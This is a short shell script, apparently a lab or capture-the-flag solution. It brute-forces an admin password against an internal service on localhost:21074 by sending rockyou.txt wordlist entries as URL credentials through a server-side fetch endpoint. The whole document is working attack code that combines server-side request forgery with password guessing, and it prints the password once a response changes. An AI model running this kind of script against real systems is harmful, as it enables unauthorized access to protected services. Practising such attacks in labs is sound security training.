#!/bin/sh

# Path to the wordlist
WORDLIST="/usr/share/wordlists/rockyou.txt"
# URL for the fetch endpoint
BASE_URL="http://localhost:80/fetch?url=http://admin:"

# Loop through each password in the wordlist
while IFS= read -r password; do
    # Check if the password contains spaces (ignore it)
    if echo "$password" | grep -q ' '; then
        continue
    fi

    # Construct the full URL
    FULL_URL="${BASE_URL}${password}@localhost:21074/"

    # Make the curl request and capture the response
    response=$(curl -s "$FULL_URL")

    # Check if the response is not the unauthorized message
    if [ "$response" != '{"content":"Unauthorized, you need to authenticate as admin","status":"success"}' ]; then
        echo "Success with password: $password"
        echo "Response: $response"
        exit 0  # Exit the script if a valid password is found
    fi
done < "$WORDLIST"

echo "No valid passwords found in $WORDLIST."
